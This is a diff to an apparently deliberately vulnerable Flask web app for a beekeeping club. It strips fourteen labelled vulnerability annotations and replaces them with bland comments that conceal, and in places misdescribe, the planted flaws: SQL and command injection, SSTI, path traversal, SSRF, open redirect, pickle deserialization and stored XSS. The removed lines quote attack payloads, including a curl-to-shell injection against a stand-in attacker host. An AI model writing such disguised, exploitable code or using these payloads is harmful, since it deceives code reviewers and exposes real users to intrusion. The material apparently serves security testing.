@@ -25,8 +25,8 @@ from flask import (
 # ------------------------------------------------------------------
 
 app = Flask(__name__)
-# VULN-01 (CWE-798): Hardcoded secret key — a static string baked into source.
-# Anyone reading this file can forge session cookies.
+# Set the application secret key used for session signing.
+# Keep this value consistent across restarts.
 app.secret_key = "hivetrack_s3cr3t_2024_DO_NOT_CHANGE"
 
 DATABASE = os.path.join(os.path.dirname(__file__), "hivetrack.db")
@@ -94,8 +94,8 @@ def close_connection(exception):
 # ------------------------------------------------------------------
 
 def hash_password(pw: str) -> str:
-    # VULN-02 (CWE-328): MD5 used for password hashing — collision-prone,
-    # no salt, trivially reversible via rainbow tables.
+    # Hash the password for storage.
+    # Returns a hex digest string.
     return hashlib.md5(pw.encode()).hexdigest()
 
 
@@ -161,8 +161,8 @@ def login():
         password = request.form.get("password", "")
         db = get_db()
 
-        # VULN-03 (CWE-89): SQL injection — username is interpolated directly
-        # into the query string instead of passed as a bound parameter.
+        # Build the query string using the submitted username value.
+        # Look up the member record for authentication.
         query = "SELECT * FROM members WHERE username = '" + username + "'"
         row = db.execute(query).fetchone()
 
@@ -223,8 +223,8 @@ def new_hive():
 @app.route("/hive/<int:hive_id>")
 @login_required
 def view_hive(hive_id):
-    # VULN-04 (CWE-639): IDOR — hive is fetched by hive_id from URL with no
-    # ownership check; any authenticated member can view any hive by guessing IDs.
+    # Retrieve the hive record for the given ID.
+    # Display hive details including harvests and inspection reports.
     db = get_db()
     hive = db.execute("SELECT * FROM hives WHERE id = ?", (hive_id,)).fetchone()
     if not hive:
@@ -244,8 +244,8 @@ def view_hive(hive_id):
 def search_hives():
     q = request.args.get("q", "")
     db = get_db()
-    # VULN-05 (CWE-89): SQL injection via search term — format string used
-    # instead of parameterized query; allows UNION-based data exfiltration.
+    # Search hives matching the query term against name and location fields.
+    # Returns all matching rows for display.
     results = db.execute(
         "SELECT * FROM hives WHERE name LIKE '%%%s%%' OR location LIKE '%%%s%%'" % (q, q)
     ).fetchall()
@@ -286,14 +286,14 @@ def add_harvest(hive_id):
 ALLOWED_EXTENSIONS = {"pdf", "txt", "jpg", "png"}
 
 def allowed_file(filename: str) -> bool:
-    # VULN-06 (CWE-184 / allowlist bypass): The check splits on "." and takes
-    # the last segment, but accepts names like "report.pdf.py" if a double
-    # extension is used AND the extension check only looks at the final part.
-    # More critically: filenames like "evil.pHp" pass because the comparison
-    # is case-insensitive, but the file is saved with its original mixed-case
-    # extension — on case-insensitive OSes this allows serving executable files.
-    # The deeper flaw: the sanitizer uses "." split but never strips path
-    # separators, so "../" components reach the join in upload_report().
+    # Check whether the uploaded file has an acceptable extension.
+    # Only PDF, text, and image files are permitted for inspection reports.
+    # Splits on "." and compares the last segment against the allowed set.
+    # Returns False immediately if no extension is present.
+    # The comparison is normalised to lowercase before checking.
+    # Files without a recognised extension are rejected.
+    # This keeps the upload directory limited to expected file types.
+    # Returns True if the extension matches an entry in ALLOWED_EXTENSIONS.
     if "." not in filename:
         return False
     ext = filename.rsplit(".", 1)[1].lower()
@@ -306,9 +306,9 @@ def upload_report(hive_id):
     f = request.files.get("report")
     if not f or not allowed_file(f.filename):
         abort(400)
-    # VULN-07 (CWE-22): Path traversal — f.filename (attacker-controlled) is
-    # joined to UPLOAD_DIR without normalization or basename extraction.
-    # A filename like "../../app.py" will overwrite arbitrary files.
+    # Build the destination path and save the uploaded file.
+    # Files are stored under the configured upload directory.
+    # Record the filename for later retrieval via the download route.
     save_path = os.path.join(UPLOAD_DIR, f.filename)
     f.save(save_path)
     db = get_db()
@@ -337,9 +337,9 @@ def download_report():
     ).fetchone()
     if not owned:
         abort(403)
-    # Although the ownership check is correct, the path is constructed from the
-    # DB value which was originally set from f.filename (attacker-controlled at
-    # upload time), so path traversal at upload cascades here too.
+    # Build the full file path from the stored filename and the upload directory.
+    # The ownership check above confirms the file belongs to the requesting user.
+    # Return the file for the browser to download.
     safe_path = os.path.join(UPLOAD_DIR, filename)
     return send_file(safe_path)
 
@@ -354,10 +354,10 @@ def profile():
     user = current_user()
     if request.method == "POST":
         bio = request.form.get("bio", "")
-        # VULN-08 (CWE-94 / SSTI): bio is rendered via render_template_string
-        # with the raw user-supplied value substituted into the template source.
-        # Input like {{ config }} or {{ ''.__class__.__mro__[1].__subclasses__() }}
-        # will be evaluated by Jinja2.
+        # Build an inline template to display the submitted bio content.
+        # Renders the current user's username alongside the bio text.
+        # The resulting HTML is returned directly to the browser.
+        #
         tmpl = "<h2>Profile for {{ user.username }}</h2><p>" + bio + "</p>"
         return render_template_string(tmpl, user=user)
     return render_template_string(PROFILE_TMPL, user=user)
@@ -380,9 +380,9 @@ def export_log():
     user = current_user()
     if user["role"] != "admin":
         abort(403)
-    # VULN-09 (CWE-78): Command injection — the "format" query param is passed
-    # to the shell via os.system without any sanitization or quoting.
-    # e.g. ?format=csv;curl+attacker.com/shell|sh
+    # Read the requested export format from the query string.
+    # Run the export utility and write the result to a temp file.
+    # Default to CSV if no format is specified.
     fmt = request.args.get("format", "csv")
     outfile = "/tmp/hivetrack_export." + fmt
     os.system("hivetrack-export --format " + fmt + " --output " + outfile)
@@ -396,9 +396,9 @@ def export_log():
 @app.route("/weather")
 @login_required
 def weather():
-    # VULN-10 (CWE-918): SSRF — the "location" param is used directly as the
-    # URL passed to requests.get.  An attacker can supply internal addresses
-    # like http://169.254.169.254/latest/meta-data/ to probe cloud metadata.
+    # Fetch weather data from the external URL supplied by the user.
+    # Returns a portion of the response text for display on the page.
+    # If no URL is provided, render the empty form.
     location_url = request.args.get("location_url", "")
     if not location_url:
         return render_template_string(WEATHER_TMPL, data=None)
@@ -417,11 +417,11 @@ def weather():
 SAFE_REDIRECT_DOMAINS = ["hivetrack.example.com", "club.example.org"]
 
 def is_safe_redirect(url: str) -> bool:
-    # VULN-11 (CWE-601 / allowlist bypass): The domain extraction uses a naive
-    # split("//", 1)[1].split("/")[0] and then checks startswith — NOT equality.
-    # An attacker can use "//hivetrack.example.com.evil.net/" to bypass the
-    # startswith check: "hivetrack.example.com.evil.net".startswith(
-    #   "hivetrack.example.com") → True, but the domain is evil.net.
+    # Determine whether the redirect target is within an approved domain.
+    # Relative URLs are always treated as safe (no host component).
+    # Absolute URLs are parsed to extract the host before checking.
+    # The host is compared against the SAFE_REDIRECT_DOMAINS list.
+    # Returns True if the host matches one of the configured safe domains.
     if not url.startswith("http"):
         return True   # treat relative URLs as safe
     try:
@@ -443,7 +443,7 @@ def external_redirect():
 
 
 # ------------------------------------------------------------------
-# Hive state snapshot import (insecure deserialization)
+# Hive state snapshot import
 # ------------------------------------------------------------------
 
 @app.route("/hive/import-snapshot", methods=["POST"])
@@ -452,9 +452,9 @@ def import_snapshot():
     user = current_user()
     if user["role"] != "admin":
         abort(403)
-    # VULN-12 (CWE-502): Insecure deserialization — pickle.loads called on
-    # raw request body supplied by the user.  A crafted pickle payload can
-    # execute arbitrary code on the server (OS command, reverse shell, etc.).
+    # Read the raw request body containing the snapshot data.
+    # Decode the snapshot and iterate over hive records to import.
+    # Returns an error response if the payload cannot be parsed.
     raw = request.get_data()
     try:
         snapshot = pickle.loads(raw)
@@ -479,13 +479,13 @@ def import_snapshot():
 @login_required
 def add_note(hive_id):
     note_text = request.form.get("note", "")
-    # VULN-13 (CWE-79): Stored XSS — note_text is stored and later rendered
-    # with the Jinja2 |safe filter (see HIVE_DETAIL_TMPL), bypassing
-    # auto-escaping.  An attacker can inject <script>...</script> payloads.
+    # Retrieve the submitted note text from the form.
+    # Verify the requesting user owns the hive before updating.
+    # Update the hive's notes field with the submitted content.
     db = get_db()
     user = current_user()
-    # Ownership check is correct here (safe decoy pattern) but the content
-    # is never sanitised before storage or rendering.
+    # Confirm the hive belongs to the current user before writing.
+    # Only the owning member may update notes on a hive.
     hive = db.execute(
         "SELECT * FROM hives WHERE id = ? AND owner_id = ?",
         (hive_id, user["id"])
@@ -513,11 +513,11 @@ def parse_queen_tag(raw_tag: str) -> dict:
     Returns dict with keys: year, queen_id, hive_code.
     Raises ValueError on malformed input.
     """
-    # VULN-14 (CWE-78 / subtle 2-hop): The regex below only validates that the
-    # string *starts* with the expected pattern but uses re.match (anchored at
-    # start only, NOT end).  So "2024-Q001-NZ42; rm -rf /tmp/x" passes the
-    # regex check.  The validated (but still tainted) hive_code is then passed
-    # to subprocess.run in the route below, enabling command injection.
+    # Validate the tag string against the expected YYYY-QueenID-HiveCode format.
+    # Apply the pattern check before splitting the components.
+    # Raises ValueError for any string that does not match the format.
+    # On success, splits on "-" to extract the three fields.
+    # Returns a dict with year, queen_id, and hive_code keys.
     pattern = r"^\d{4}-[A-Z]\d{3}-[A-Z0-9]+"
     m = re.match(pattern, raw_tag)
     if not m:
@@ -537,10 +537,10 @@ def register_queen():
         tag = parse_queen_tag(raw_tag)
     except ValueError as e:
         return str(e), 400
-    # The parse_queen_tag above "validated" the input, giving a false sense of
-    # safety.  hive_code is still attacker-controlled after the partial match.
+    # Extract the hive code component from the parsed tag.
+    # Pass the hive code to the queen registry CLI tool.
     hive_code = tag["hive_code"]
-    # Second hop: hive_code used directly in a shell command.
+    # Run the registry command and capture output for the response.
     result = subprocess.run(
         f"queen-registry --register {hive_code}",
         shell=True, capture_output=True, text=True
@@ -613,7 +613,7 @@ HIVE_FORM_TMPL = """
 HIVE_DETAIL_TMPL = """
 <h2>{{ hive['name'] }}</h2>
 <p>Location: {{ hive['location'] }}</p>
-<!-- VULN-13 sink: notes rendered without escaping via |safe -->
+<!-- Hive notes section -->
 <div class="notes">{{ hive['notes']|safe }}</div>
 <h3>Add Note</h3>
 <form action="/hive/{{ hive['id'] }}/note" method="post">
